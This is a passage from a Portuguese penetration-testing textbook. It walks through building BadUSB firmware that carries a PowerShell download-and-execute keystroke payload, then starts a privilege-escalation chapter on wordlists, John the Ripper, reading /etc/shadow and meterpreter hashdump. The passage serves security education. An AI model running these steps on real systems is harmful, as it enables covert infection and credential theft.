em\nhttps://github.com/adamcaudill/Psychson/wiki/Known-Supported-Devices.\nPorém,\tmesmo\talguns\tdispositivos\tque\testão\tnessa\tlista\te\tteoricamente\tpossuem\no\t\nps2251-03\n,\tpor\tvezes,\tacabam\ttendo\to\tfirmware\ttrocado,\tcomo\té\to\tcaso\tdo\nDataTraveler\t(modelo\tDT100\tde\t8GB).\tEntão,\tatente-se\tno\tmomento\tda\tcompra\ndo\tUSB.\nVamos\tutilizar\to\tUSB\tKingston\tDataTraveler\t3.0\tDT111\t8GB,\tconforme\tmostra\na\tfigura\t10.7.\nFigura\t10.7\t–\tUSB\tKingston\tDataTraveler\t3.0\tDT111\t8GB.\tFonte:\nhttp://www.amazon.com/Kingston-Digital-DataTraveler-DT111-\n8GB/dp/B0090J600G.\nPrimeiro,\tfaça\to\tdownload\tdos\tarquivos\tdo\tBadUSB\tencontrados\tem\nhttps://github.com/adamcaudill/Psychson/archive/master.zip\n.\nSegundo\t\nhttps://github.com/adamcaudill/Psychson/wiki/Obtaining-a-Burner-\nImage\n:Um\tburner\timage\té\trequerido\tpara\ttrocarmos\tou\tatualizarmos\to\tfirmware.\nUm\tburner\timage\té\ttipicamente\tnomeado\tusando\ta\tseguinte\tconvenção:\nBNxxVyyyyz.BIN\nOnde\txx\té\ta\tversão\tdo\tcontrolador\t(03\tpara\to\tfirmware\tps2251-03(2303)),\te\nyyyy\té\ta\tversão\t(irrelevante),\te\tz\tindica\to\t“page\tsize”.\nZ\tpode\tser\tde\tum\tdos\ttipos:\n•\t2KM\t–\tIndica\tque\tisso\t(page\tsize)\té\tpara\t2k\tnand\tchip.\n•\t4KM\t–\tIndica\tque\tisso\t(page\tsize)\té\tpara\t4k\tnand\tchip.\n•\tM\t–\tIndica\tque\tisso\t(page\tsize)\té\tpara\t8k\tnand\tchip.\nPelas\tpalavras\tdo\tAdam:\nTodas\tas\tversões\tdo\tPatriot\t8GB\tSupersonic\tXpress\t(DE\tFATO,\tTODOS\nOS\tUSBs\t3.0)\tutilizam\t8k\tnand\tchip.\tUm\texemplo\tde\tburner\timage\tdeve\nser\t\nBN03V104M.BIN\n.\nEntão\to\tburner\timage\tpara\to\tnosso\tDT11\tdeve\tser\to\t\nBN03V104M.BIN\n.\tEssa\nimagem\tpode\tser\tobtida\tem\t\nhttp://www.usbdev.ru/files/phison/\n,\tdentro\tdo\narquivo\t\nfirmware_ps2251-03.rar\n.\t(\nhttp://www.usbdev.ru/?wpfb_dl=777\n).\nÉ\tnecessário\ttambém\tcompilar\to\tcódigo-fonte\tdo\tprojeto\tdo\tAdam.\tPara\tisso,\té\nnecessário\tque\to\tWindows\ttenha\to\t.NET\ta\tpartir\tda\tversão\t4.0,\tsendo\tnecessário\ntambém\tter\to\tVisual\tStudio\tExpress\t2012\t(\nhttp://www.microsoft.com/en-\nus/download/details.aspx?id=34673\n)\te\to\tSDCC\t(\nhttp://sdcc.sourceforge.net/\n)\ninstalados.\nRealizada\ta\tinstalação\tdesse\tlaboratório,\té\tnecessário\tcompilar\to\tcódigo-fonte\tdo\nBadUSB\tcom\to\tVisual\tStudio\t(são\tos\tarquivos\t\n.sln\n\t–\tcompile-os\tpor\tmeio\tda\naba\t\nBuild\t\ndo\tVisual\tStudio).\tLembre-se\tde\tcompilar\ttodos\tos\tarquivos.\tMais\ninformações\tsobre\to\tque\té\tcada\tarquivo\tcom\ta\tsua\tfuncionalidade\tpodem\tser\nobtidas\tem\t\nhttps://github.com/adamcaudill/Psychson\n.\nAlém\tdo\t“burner\timage”\t(\nBN03V104M.BIN\n),\ttambém\té\tnecessário\to\tfirmware\ncustomizado,\tque\té\tencontrado\tna\tpasta\t\nfirmware\n.\tExecute\to\tarquivo\t\nbuild.bat\n(\nfirmware/build.bat\n)\tpara\tgerar\to\tfirmware\tcustomizado\t\nfirmware/bin/fw.bin\n(são\texibidas\talgumas\tmensagens\tde\talerta,\tmas\tsão\tirrelevantes).\nVamos\tcriar\tuma\tcópia\tdo\tfirmware\tcustomizado\t(\nfirmware/bin/fw.bin\n)\tdentro\ndo\tdiretório\t\ntools\n\tcom\to\tnome\tde\tCFW.bin\t(\ntools/CFW.bin\n).\tTambém\tvamoscriar\tuma\tcópia\tdo\t“burner\timage”\tdentro\tdo\tdiretório\t\ntools\n\t(\ntools/\nBN03V104M.BIN\n).\nUma\tvez\tcom\to\tprojeto\tcompilado,\tos\tarquivos\tbinários\tserão\tgerados\tdentro\tdo\ndiretório\t\ntools\n.\tAinda\tdentro\tdesse\tdiretório\tserá\tgerado\to\tarquivo\nDriveCom.exe\n.\nInsira\to\tpendrive,\tabra\tum\tprompt\tde\tcomandos\te\tnavegue\taté\ta\tpasta\t\ntools\n.\nObtenha\tas\tinformações\tsobre\to\tUSB\tpara\tchecar\tse\tele\tcontém\ta\tversão\tcorreta\ncom\to\tfirmware\tcorreto.\nC:\\Users\\Win7\\Desktop\\Psychson\\tools>\t\nDriveCom.exe\t/drive=E\t/action=GetInfo\nAction\tspecified:\tGetInfo\nGathering\tInformation\nReported\tchip\ttype:\t\n2303\nReported\tchip\tID:\nReported\tfirmware\tversion:\t\n1.01.53\nMode:\tFirmware\nO\tchip\tindica\t2303\t(ps2251-03\tcom\to\tfirmware\t1.01.53\t[firmware\tcorreto\tpara\nos\ttestes]).\nApós\tchecarmos\tse\ta\tversão\tdo\tdispositivo\té\ta\tversão\tcorreta,\tvamos\tcriar\to\nfirmware\tcom\ta\tbackdoor.\tPara\tisso,\to\tpayload\tescolhido\tdeverá\tser\tum\tdos\npayloads\tdo\tRuber\tDucky\t(isso\tporque\to\tBadUSB\ttransforma\to\tUSB\tem\tum\nsimulador\tde\tteclado\tidêntico\tao\tRuber\tDucky,\te\tdeve-se\tutilizar\tos\tmesmos\npayloads)\tque\tpode\tser\tobtido\tem\t\nhttps://github.com/hak5darren/USB-Rubber-\nDucky/wiki/Payloads\n.\nParticularmente,\tgosto\tdo\tPowerShell\twget+Execute,\trápido\te\tquase\nimperceptível:\t (\nhttps://github.com/hak5darren/USB-Rubber-\nDucky/wiki/Payload---powershell-wget---execute\n).\tAltere-o\tde\tacordo\tcom\ta\tsua\nnecessidade.\nDe\tacordo\tcom\tAdam\te\tcom\to\tque\teu\tobservei\tnas\tlistas\tde\tdiscussão\tdo\nBadUSB,\té\tpossível\trestaurar\to\tfirmware\toriginal\tdepois\tque\to\tUSB\ttiver\to\tseu\nfirmware\tadulterado.\tMas,\tpara\tisso,\tvocê\tdeve\tquebrar\ta\tcaixinha\tdo\tUSB\te\ninserir\tuma\tfaca\tou\tagulha\tsobre\tos\tPINs\tcorretos,\tque\tsão\tdois\tou\ttrês\tPINs\nexibidos\tna\tfigura\tdentro\tdo\tdiretório\t\ndocs\n(\ndocs/PinsToShortUponPlugInForBootMode.jpg\n).\tDessa\tforma\té\tpossível\nrestaurar\to\tfirmware\toriginal\tou\tmesmo\tcolocar\toutros\tfirmwares.\tMais\ninformações\tsobre\tesse\tprocedimento\tpodem\tser\tencontradas\temhttps://github.com/adamcaudill/Psychson/wiki/Executing-From-Boot-ROM\n\te\tem\ndiversas\tlistas\tde\tdiscussão\tsobre\tdiversos\tproblemas\tdo\tBadUSB\nhttps://github.com/adamcaudill/Psychson/issues/\n.\tCaso\to\tleitor\tqueira\tmanter\tum\nbackup\tdo\tseu\tfirmware\toriginal,\tpoderá\trealizá-lo\tcom\to\tDriveCom.exe.\nDriveCom.exe\t/drive=E\t/action=DumpFirmware\t/burner=BN03V104M.BIN\n/firmware=firmware_original.bin\nParticularmente,\tnão\tgosto\tde\tusá-lo,\tpois\té\tnecessário\tquebrar\ta\tcaixinha\tdo\nUSB,\talém\tde\tesse\tprocedimento\tser\tbem\ttrabalhoso.\tPortanto,\tleitor,\ttenha\tem\nmente\tque\tuma\tvez\tcom\to\tfirmware\talterado,\t“não\thá\tmais\tvolta”.\nUma\tvez\tselecionado\to\tpayload,\tgere\to\tarquivo\t\nbin\n\tpor\tmeio\tdo\tJava\t(é\nnecessário\to\tJava\tinstalado)\te\tdo\tduckencode.\nC:\\Users\\win7\\Desktop\\DuckEncoder_2_6_3>\t\njava\t-jar\tencoder.java\t-i\twget_powershell_payload.txt\t-\no\tinject.bin\nHak5\tDuck\tEncoder\t2.6.3\nLoding\tFile...\t\t\t\t\t\t\t\t\t\t\t\t[OK]\nLoading\tKeyboard\tFile...\t\t[OK]\nLoading\tLanguage\tFile...\t\t[OK]\nLoading\tDuckScript...\t\t\t\t\t[OK]\nDuckScript\tComplete...\t\t\t\t[OK]\nCrie\tuma\tcópia\tdo\tarquivo\t\ninject.bin\n\tpara\to\tdiretório\t\ntools\n\t(\nPsychson/tools\n).\nTambém\té\tinteressante\tmantermos\to\tfirmware\tcustomizado\t(\nCFW.bin\n)\tde\nmaneira\tintacta\t(será\tinjetada\ta\tbackdoor\tnesse\tfirmware),\tentão\tcrie\tuma\tcópia\ndentro\tdo\tdiretório\t\ntools\n\tcom\to\tnome\tde\t\nhid.bin\n\t(\ntools/hid.bin\n\t–\tesse\tserá\to\nfirmware\tcustomizado\tem\tque\tserá\tinserida\ta\tbackdoor).\nInjete\to\tpayload\tdentro\tdo\t\nhid.bin\n:\nC:\\Users\\Win7\\Desktop\\Psychson\\tools>\t\nEmbedPayload.exe\tinject.bin\thid.bin\nFile\tupdate.\nA\túltima\tetapa\tconsiste\tem\tenviar\to\tfirmware\tinfectado\tcom\ta\tbackdoor\tpara\to\npendrive.\nPsychson\\tools>\t\nDriveCom.exe\t/drive=E\t/action=SendFirmware\t/burner=BN03V104M.BIN\n/firmware=hid.bin\nAction\tspecified:\tSendFirmware\nGathering\tInformation\nReported\tchip\ttype:\t2303\nReported\tchip\tID:\nReported\tfirmware\tversion:\t1.01.53Reported\tfirmware\tversion:\t1.01.53\nMode:\tFirmware\nSwitching\tto\tboot\tmode...\nRebooting...\nSending\tfirmware...\nExecuting...\nMode:\tFirmware\nNesse\tmomento,\to\tnosso\tBadUSB\tfoi\tcriado\tcom\tsucesso.\nRetire\to\tpendrive\te\tinsira-o\tno\tWindows\t7.\nUm\tsimples\tUSB\temulou\tum\tteclado\te\tinfecta\tuma\tmáquina\trodando\tWindows!\nQue\ttal\tno\tlugar\tde\tum\tarquivo\tqualquer\t(\nbob.old–’http://example.com/bob.old’\n)\ncolocarmos\tuma\tbackdoor\tcom\to\tpayload\tMeterpreter?\nMais\tinformações\tsobre\to\tprojeto\tpodem\tser\tencontradas\tem\nhttps://github.com/adamcaudill/Psychson\n.\nNovamente,\tobrigado,\tAdam\t;-)\n1\n\tProcesso\tde\tataque\toriginalmente\tintroduzido\tpor\tShakeel\tAli\te\tTedi\tHeriyanto,\tautores\tdo\tlivro\nBacktrack\t4:\tAssuring\tSecurity\tby\tPenetration\tTesting\n.\t(p.\t220\te\t221.)CAPÍTULO\n\t11\nEscalonamento\tde\tprivilégios\nUma\tvez\tque\to\tsistema\ttenha\tsido\texplorado,\ta\tpróxima\tetapa\tconsiste\tno\nescalonamento\tde\tprivilégios,\tem\tque\to\tauditor\tconsegue\tacesso\trestrito\tao\nsistema\te\tnecessita\tde\tacesso\ta\tcontas\tprivilegiadas\tpara\texecutar\tprogramas\tque\nrequerem\tprivilégios\tadministrativos.\nNessa\tetapa,\to\tauditor\ttenta\ttransformar\to\tseu\tacesso\trestrito\tem\tacesso\tirrestrito,\nseja\tquebrando\to\tarquivo\tde\tsenhas\tde\tcontas\tprivilegiadas\tou,\taté\tmesmo,\ninstalando\tfarejadores\t(sniffers)\tou\tprogramas\tque\tcapturam\tteclas\tdigitadas\n(keyloggers)\tna\tmáquina\tlocal.\nPara\tque\tum\tusuário\tconsiga\tacessar\tcom\tsucesso\to\tseu\tsistema,\tos\tmétodos\tde\nautenticação\tpodem\tser\tclassificados\tem\ttrês\ttipos\n1\n:\n•\t\nArquivos\tde\tautenticação\n\t–\tNesta\tcategoria\tencontra-se\to\tmecanismo\tde\nsenhas\tconvencionais.\tEx:\to\tusuário\tA\ttem\ta\tsenha\t123,\tlogo\tqualquer\tpessoa\nque\tlogar\tno\tsistema\tcom\to\tusuário\tA\te\ta\tsenha\t123\tserá\tconsiderada\to\nusuário\tA.\n•\t\nTokens\n\t–\tNesta\tcategoria\tencontram-se\tmétodos\tde\tautenticação\tum\tpouco\nmais\tsofisticados\tdo\tque\tna\tcategoria\tanterior,\tcomo\to\tsistemas\tde\ttokens.\n•\t\nBiometria\n\t–Nesta\tcategoria\tencontra-se\to\tsistema\tde\tbiometria\te\tretina.\tÉ\nmais\tsegura\tem\tcomparação\tàs\tcategorias\t“Arquivos\tde\tautenticação”\te\n“Tokens”.\nO\tlivro\té\tfocado\tno\tprimeiro\ttipo\tde\tautenticação,\te\ta\tsua\tquebra\tpode\tser\ttanto\noffline\tcomo\tonline.\n11.1\tEscalonamento\tde\tprivilégios\toffline\nToda\te\tqualquer\tnatureza\tde\tquebra\tde\tsenhas\tem\tque\tse\ttransfira\to\tarquivo\tde\nsenhas\tpara\ta\tmáquina\tdo\tauditor\té\tconsiderada\tescalonamento\tde\tprivilégios\noffline,\tisso\tporque\tnão\té\tnecessário\testar\tonline,\tou\tna\tinternet,\tpara\trealizar\ta\nquebra\tde\tsenhas.\tPor\texemplo:\tApós\tescalonado\to\tprivilégio\tpara\tacessoadministrativo\tem\tmáquinas\tWindows\te\ttransferido\to\tarquivo\tde\thash\tde\tsenhas,\ntodo\to\trestante\tdo\tprocesso\tpara\tquebra\tde\tsenhas\tocorre\tna\tmáquina\tdo\tauditor.\nA\tgrande\tvantagem\tdesse\tmétodo\té\tque\tnão\thá\tnenhum\tmecanismo\tpara\nbloqueio\tde\ttentativas\tde\tquebra\tde\tsenha;\ta\tgrande\tdesvantagem\té\tque,\tde\nalguma\tforma,\to\tauditor\tnecessita\tter\tacesso\tao\tarquivo\tde\tsenhas\t(seja\nganhando\tacesso\tremoto,\tacesso\tfísico\tou\toutros).\n11.1.1\tCommon\tUser\tPasswords\tProfiler\nAntes\tde\tser\tiniciado\to\tprocesso\tde\tquebra\tdo\tarquivo\tde\tsenhas,\to\tauditor\tvai\nnecessitar\tde\tuma\tlista\tde\tpalavras\tque\tcontenha\tas\tpossíveis\tsenhas\ta\tserem\nquebradas.\tEssa\tlista\tpode\tser\tobtida\tna\tinternet,\te\to\tKali\tLinux\tcontém\to\nexcelente\tdiretório\t\n/usr/share/wordlist/\t\ncom\tvárias\tlistas\tde\tpalavras.\tO\tarquivo\n/usr/share/wordlist/rockyou.txt.gz\n\tcontém\tpalavras\tnormalmente\tusadas\tcomo\nsenhas.\tUm\tbom\tdicionário\tnão\té\tum\tdicionário\tcom\tmilhares\tde\tpalavras,\te\tsim\ncom\tpalavras\tque\tsão\tutilizadas\tcomo\tprováveis\tsenhas.\tPor\texemplo,\ninformações\ta\trespeito\tdo\tproprietário\tda\trede,\tcomo\tnome,\ttelefone,\tdatas\tde\naniversários\tetc.\tjá\tconstituem\tuma\tbase\tsólida\tpara\tconstrução\tde\tuma\tboa\tlista.\nCom\tcerteza,\tuma\tlista\tbem\telaborada\tterá\tuma\ttaxa\tde\tsucesso\tinfinitamente\nmaior\tdo\tque\tlistas\tprontas\tencontradas\tpela\tinternet.\tPor\texemplo,\ta\tsua\nwordlist\n\tpode\tser:\nteste\nteste123\nteste10\nteSte\nTESTE\n123teste\n...\n11.1.1.1\tCUPP\nPorém\tderivações\tda\tpalavra\tteste\tpodem\tser\tcansativas\tse\tforem\tescritas\nmanualmente.\tPara\tisso,\ta\tferramenta\tCUPP\tnos\tauxilia\tnessa\tetapa.\tO\ndownload\tdo\tCUPP\tpode\tser\trealizado\tem\t\nhttp://www.remote-\nexploit.org/content/cupp-3.0.tar.gz\n.\nNo\tseu\tcódigo-fonte\thá\tum\terro,\tmais\tprecisamente\tna\tlinha\t289.\tInverta\to\tfinal\nda\tlinha.\n•\tCódigo\toriginal.split(\",\t\").lower()\n•\tCorreção\n.lower().split(\",\t\")\nUtilize\to\tmodo\tinterativo\tpara\tcriar\tuma\tlista\tde\tpalavras\tnova.\tNesse\tmodo,\nperguntas\tsão\tfeitas\tpara\tcriação\tdo\tdicionário,\tcomo\tqual\té\to\tnome\tda\tsua\nvítima,\tnome\tda\tsua\tesposa,\tdata\tde\tnascimento\tetc.\nroot@kali#\n\tpython\tcupp.py\t-i\nO\tCUPP\ttambém\tpode\tgerar\tlista\tde\tpalavras\t(\nwordlists\n)\ta\tpartir\tde\toutras\nwordlists\n.\tMas\tlembre-se\tde\tque\tessa\topção\tdeve\tser\tutilizada\tcom\tlistas\npequenas,\tpois\tuma\tlista\tmuito\tgrande\tpode\tgerar\toutras\tlistas\tcom\tterabytes\tde\ntamanho\te\ttornar-se\ttotalmente\tinviável.\nroot@kali#\n\tpython\tcupp.py\t-w\twordlist\nO\tCUPP\tcontém\to\tarquivo\tde\tconfiguração\t\ncupp.cfg\n,\tque\tpode\tser\talterado\tde\nacordo\tcom\ta\tnecessidade\tdo\tauditor.\n11.1.1.2\tCrunch\nO\tCrunch\té\toutra\tferramenta\tque\tpossibilita\ta\tgeração\tde\tdicionários.\tSua\nutilização\té\tsimples:\ncrunch\tmin\tmax\tcaracteres\t-o\tsaída\nmin\nNúmero\tmínimo\tde\tcaracteres\tque\tfarão\tparte\tda\t\nwordlist.\nmax\nNúmero\tmáximo\tde\tcaracteres\tque\tfarão\tparte\tda\t\nwordlist.\ncaracteres\nQuais\tsão\tos\tcaracteres\tque\tformarão\ta\t\nwordlist\n.\nsaída\nArquivo\tde\ttexto\tque\tserá\tgerado.\nPor\texemplo,\tvamos\tgerar\tuma\tlista\tde\tpalavras\tde\t1\taté\t6\tcaracteres\tcontendo\nos\tcaracteres\t“rot123”.\nroot@kali#\n\tcrunch\t1\t6\trot123\t-o\t/root/lista\nObservem\ta\tdiferença\tentre\to\tCUPP\te\to\tCrunch:\to\tCUPP\tgera\tuma\tlista\tde\npalavras\t(ajustável\talterando-se\to\tarquivo\t\ncupp.cfg\n)\te\to\tCrunch\tgera\tuma\tlista\tde\ncaracteres\t(caracteres\tesses\tque\testão\tembaralhados).\nA\tutilização\tdo\tCUPP\té\tmais\trecomendada\tquando\to\tauditor\tnecessitar\tacertar\ta\nsenha\t(quando\tjá\tse\ttem\tuma\tnoção\tde\tqual\tseja\ta\tsenha\te\tse\tdeseja\tgerarderivações\tdessas\tpalavras),\tjá\ta\tutilização\tdo\tCrunch\té\tmais\trecomendada\tem\nprocessos\tde\tforça\tbruta\tou\tquando\tnão\tse\ttem\ta\tmenor\tideia\tde\tqual\tseja\ta\nsenha.\nO\tCrunch\tpossibilita\toutras\tcombinações\tcomo\to\tuso\tdo\tparâmetro\t\n–t\n,\tque\tforça\na\tutilização\tda\tcadeia\tde\tcaracteres.\tPor\texemplo:\to\tCrunch\tvai\tgerar\tuma\tlista\nde\tpalavras\tde\t7\tcaracteres,\tsendo\tque\tos\t4\tprimeiros\tsão\ta\tcadeia\t“root”.\tOs\ttrês\núltimos\tpodem\tser\tos\tcaracteres\t1,2\tou\t3.\nroot@kali#\n\tcrunch\t7\t7\t123\t–t\troot@@@\t-o\t/root/lista\nO\tmetacaracter\t@\tpode\tser\tsubstituído\tpor\toutros\tmetacaracteres.\n@\nLower\tcase\t–\tCaractere\tliteral\n,\nUpper\tcase\t–\tCaractere\tmaiúsculo\n%\nNumbers\t–\tnúmeros\n^\nSymbols\t–\tSímbolos\nOutro\texemplo:\tO\tCrunch\tvai\tgerar\tuma\tlista\tde\tsete\tcaracteres,\tsendo\tque\ta\nlista\tiniciará\tpor\t“root”,\to\tpróximo\tdígito\tserá\tum\tcaractere\tminúsculo,\tseguido\nde\tum\tcaractere\tmaiúsculo\te\tum\tnúmero:\nroot@kali#\n\tcrunch\t7\t7\t-t\troot@,%\t-o\t/root/lista\nO\tCrunch\ttem\tcadeia\tde\tcaracteres\tpredefinidos\t(por\texemplo:\tsomente\tvalores\nhexadecimais,\tsomente\tnúmeros\tetc.)\tque\tse\tencontram\tno\tarquivo\n/usr/share/crunch/charset.lst.\nPode-se\tescolher\tessa\tcadeia\tde\tcaracteres\tcom\ta\topção\t\n–f\n\tseguida\tdo\ttipo\ndesejado:\nroot@kali#\n\tcrunch\t1\t3\t–f\t/usr/share/crunch/charset.lst\tmixalpha-numeric\t–o\t/root/lista\nA\tlista\tgerada\tpode\tser\tdividida\tpor\ttamanho.\tPara\tisso,\tescolha\ta\topção\t\n–o\nseguida\tde\t\n–b\n.\nroot@kali#\n\tcrunch\t5\t5\t–f\t/usr/share/crunch/charset.lst\tmixalpha-numeric\t–t\tadm@@\t\n-o\tSTART\t–b\t5kb\nA\tlista\tgerada\tpode\tser\tdividida\tpor\tnúmero\tde\tlinhas:\nroot@kali#\ncrunch\t5\t5\t–f\t/usr/share/crunch/charset.lst\tmixalpha-numeric\t–t\tadm@@\t\n-o\tSTART\t–c\t500\n11.1.1.3\tJohn\tthe\tRipper\nJohn\tthe\tRipper\té\tuma\tferramenta\tusada\tpara\tquebra\tde\thash\tde\tsenhas,\nsuportando\tvários\tmétodos\tcriptográficos,\tcomo\tmd5,\tsha1,\tpsk\te\toutros.\tPodeoperar\tem\tum\tdestes\tmodos:\n•\t\nSingle\tcrack\t\n–\tTentará\tquebrar\tas\tsenhas\tusando\to\tnome,\tderivações\tdo\nnome,\tdiretório\thome\tdo\tusuário\tetc.\tFornecido\tcom\ta\topção\t\n--single\n.\n•\t\nWordlist\n\t–\tUma\tlista\tde\tpalavras\té\tfornecida\tao\tJohn\tthe\tRipper\tpara\tefetuar\na\tquebra\tde\tsenhas.\tFornecida\tcom\ta\topção\t\n--wordlist=\n.\n•\t\nIncremental\tmode\n\t–\tTentará\ttodas\tas\tcombinações\tpossíveis\tde\tusuário\te\nsenha,\tmétodo\tconhecido\tcomo\tforça\tbruta.\tÉ\ta\tcondição\t100%\tcerteira,\nporém,\tdependendo\tda\tcomplexidade\tda\tsenha,\ta\tsua\tquebra\tserá\ttotalmente\ninviável.\tFornecido\tcom\ta\topção\t\n–-incremental\n.\n•\t\nExternal\tmode\n\t–\tModo\tde\toperação\tmais\tcomplexo.\tNesse\tmodo,\tpoderá\tser\nutilizado\tum\tcomponente\texterno\tpara\ta\tquebra\tdas\tsenhas\t(por\tmeio\tde\nreprogramação\tdo\tseu\tcódigo-fonte).\tNão\tserá\tabordado\tneste\tlivro.\nObservações:\n1\n.\tCaso\tnenhuma\topção\tseja\tfornecida\tao\tJohn\tthe\tRipper,\tserá\tutilizada\ta\nopção\tpadrão:\tprimeiro\tserá\tfeita\ta\ttentativa\tda\tquebra\tpelo\tmodo\t\nsingle\n,\ndepois\tserá\tusada\ta\t\nwordlist\n\tpadrão\tdo\tJohn\tthe\tRipper\tlocalizada\tem\n/usr/share/john/password.lst\n\t\ne,\tpor\túltimo,\to\tmodo\t\nincremental\n.\n2\n.\tEm\tqualquer\tmodo\tpode\tser\tfornecido\t\nCtrl+C\n\tpara\tinterromper\to\tprocesso\nde\tquebra,\tcaso\tdeseje\tvoltar\tà\tquebra:\njohn\t--restore\n3\n.\tApós\tfinalizar\to\tprocesso\tde\tquebra,\tpara\texibir\tas\tsenhas:\njohn\tarquivo_com_hash_das_senhas\t--show\n4\n.\tO\tJohn\tthe\tRipper\tarmazena\tas\tsenhas\tque\tforam\tcrackeadas\tno\tarquivo\n/root/.john/john.pot\n.\tEntão,\tcaso\ta\tsenha\tseja\tdecifrada,\te\to\tleitor\ttentar\nrealizar\tnovamente\ta\tquebra\tde\tsenhas,\to\tJohn\tthe\tRipper\tnão\tfará\ta\tquebra,\nisso\tporque\to\thash\tda\tsenha\tjá\tfoi\tdecifrado\te\testá\tarmazenado\tnesse\tarquivo.\nApague\tesse\tarquivo\tpara\trealizar\tmúltiplos\ttestes\tsobre\ta\tmesma\tsenha.\n5\n.\tO\tJohn\tthe\tRipper\tarmazena\to\tprogresso\tda\tquebra\tde\tsenhas\tno\tarquivo\n/root/.john/john.rec\n.\tCaso\to\tprocesso\tde\tquebra\tde\tsenhas\tseja\tinterrompido\te\nesse\tarquivo\tseja\tapagado,\tfuturas\trestaurações\tnão\tserão\tpossíveis\t(a\tquebra\nda\tsenha\tvai\trecomeçar\tdo\tzero\tnovamente).\n11.1.1.4\tQuebra\tde\tsenhas\tno\tLinux11.1.1.4\tQuebra\tde\tsenhas\tno\tLinux\nPrimeiro\tserá\tadicionado\tum\tusuário\t\nteste\n\tcom\ta\tsenha\t\nteste\n\tno\tKali\tLinux:\nroot@kali#\n\tadduser\tteste\nCrie\ta\t\nwordlist\t/root/wordlist\n\tcontendo\tas\tpalavras\t\nroot\n\te\t\nteste\n:\nroot@kali#\n\techo\troot\t>\twordlist\nroot@kali#\n\techo\tteste\t>>\twordlist\nPara\tquebrar\tas\tsenhas\tdo\tLinux,\tdeverá\tser\texecutado\to\tcomando\t\nunshadow\n:\nroot@kali#\t\nunshadow\t/etc/passwd\t/etc/shadow\t>\t/root/senhas\nO\tcomando\t\nunshadow\n\té\tnecessário,\tpois\to\tJohn\tvai\tjuntar\tos\tarquivos\t\npasswd\n\te\nshadow\n\tcomo\tsendo\tsomente\tum;\tessencial\tpara\to\tmodo\t\nsingle\n,\tque\tse\tutilizará\ndessas\tpalavras\t(como\tnome,\tcomentários\tetc.)\tpara\telaboração\tde\tuma\t\nwordlist\ninteligente.\n1.\tOpção\tpadrão\nroot@kali#\t\ncd\t/root/\nroot@kali#\t\njohn\tsenhas\nroot@kali#\t\njohn\tsenhas\t--show\t\tExibe\ta\tsenha\tdecifrada\n2.\tSingle\tCrack\nroot@kali#\t\ncd\t/root/\nroot@kali#\t\njohn\t--single\tsenhas\n3.\tWordlist\nroot@kali#\t\ncd\t/root/\nroot@kali#\t\njohn\t--wordlist=/root/lista\tsenhas\n4.\tWordlist\tcom\tRules\nroot@kali#\t\ncd\t/root/\nroot@kali#\t\njohn\t--wordlist=/root/lista\t--rules=Single\tsenhas\nroot@kali#\t\njohn\t--wordlist=/root/lista\t--rules=Extra\tsenhas\nroot@kali#\t\njohn\t--wordlist=/root/lista\t--rules=Wordlist\tsenhas\nroot@kali#\t\njohn\t--wordlist=/root/lista\t--rules=NT\tsenhas\nroot@kali#\t\njohn\t--wordlist=/root/lista\t--rules=Single-Extra\tsenhas\nroot@kali#\t\njohn\t--wordlist=/root/lista\t--rules=Jumbo\tsenhas\nPara\tmais\tinformações\tsobre\to\tmodo\tde\trules,\tconsulte\to\tarquivo\n/etc/john/john.conf\n.\n5.\tModo\tincremental\nroot@kali#\n\tcd\t/root/root@kali#\t\njohn\t--incremental\tsenhas\n6.\tRestaurando\ta\tsessão\nroot@kali#\t\ncd\t/root/\nroot@kali#\t\njohn\t--incremental\tsenhas\nDigite\tCtrl+C\nroot@kali#\t\njohn\t--restore\n11.1.1.5\tQuebra\tde\tsenhas\tno\tWindows\nA\tquebra\tdo\tarquivo\tde\tsenhas\tno\tWindows\té\tum\tpouco\tdiferenciada.\nPara\tversões\tde\tWindows\tinferiores\tao\tVista,\to\tprocesso\té\tsimilar\tà\tquebra\tde\nsenhas\tno\tLinux.\n•\tConsiga\tacesso\tmeterpreter\tao\tWindows\tVista\tou\tXP.\n•\tConsiga\tacesso\tcomo\tsendo\t\nnt\tauthority\\system\n.\nmeterpreter\n\t>\tgetsystem\n•\tAcesse\to\thash\tde\tsenhas\tdo\tsistema\tWindows\tpor\tmeio\tdo\tmódulo\nhashdump\n.\nmeterpreter\n\t>\trun\thashdump\n•\tCopie\to\thash\tpara\tum\tarquivo\tde\ttexto\te\trealize\ta\tquebra\tde\tsenhas.\nroot@kali#\t\njohn\tsenhas_WinXP\nPara\tversões\tdo\tWindows\tsuperiores\tao\tVista\t(como\tWindows\t7\tou\t8):\tconsiga\nacesso\tao\tusuário\t\nnt\tauthority\\system\n\t(pode\tser\tvisualizado\tna\tseção\t9.4.5\t“User\nInterface\tcommands”).\n•\tAcesse\to\thash\tde\tsenhas\tdo\tsistema\tWindows\tpor\tmeio\tdo\tmódulo\nhashdump\n:\nmeterpreter\n>\trun\thashdump\n•\tCopie\to\thash\tpara\tum\tarquivo\tde\ttexto\te\trealize\ta\tquebra\tde\tsenhas:\nroot@kali#\t\njohn\t\nsenhas_Win7\t\n--format=nt\n•\tPara\texibir\tas\tsenhas\tencontradas:\nroot@kali#\t\njohn\t\nsenhas_Win7\t\n--format=nt\t--show\n11.1.1.6\tWindows\tCredentials\tEditor\nO\tprocesso\trealizado\tcom\to\tJohn\tthe\tRipper,\taté\to\tpresente\tmomento,\npossibilita-nos\trecuperar\ta\tsenha\tpor\tmeio\tde\tataques\tde\tdicionários.\tE\tse\teudisser\ta\tvocê\tque\texiste\tum\tmodo\tmais\tfácil,\tbem\tmais\tfácil\tde\trecuperar\tsenhas\ndo\tWindows?\tTão\tfácil\tao\tponto\tde\tque\tnão\té\tnecessário\trodar\tnenhum\tprocesso\nde\tforça\tbruta\tou\tdicionário?\tÉ\tsó\trodar\to\tWindows\tCredentials\tEditor\te\tpronto:\ntemos\tas\tcredenciais\tdo\tsistema.\nEm\ttempos\tmais\tantigos,\tfoi\tcriada\tuma\ttécnica\tdenominada\t\npass-the-hash\n(passar\tpelo\thash),\tcujo\tobjetivo\tera\tlogar\tno\tsistema\tsomente\tpor\tmeio\tdo\thash\nda\tsenha,\tsem\ta\tnecessidade\tde\tsaber\tqual\té\ta\tsenha.\tUma\tvez\tcom\to\tsistema\ncomprometido,\to\tatacante\tpoderia\trecuperar\to\thash\tde\tsenhas\tdo\tsistema\te\nutilizá-lo\tpara\tautenticar-se\tem\tserviços\tque\tutilizam\to\thash\tLM\te/ou\tNTLM\n(como\tum\tservidor\tremoto\tSMB),\tescalando\to\tseu\tprivilégio\tpara\talém\tda\nmáquina\tlocal\te\tganhando\t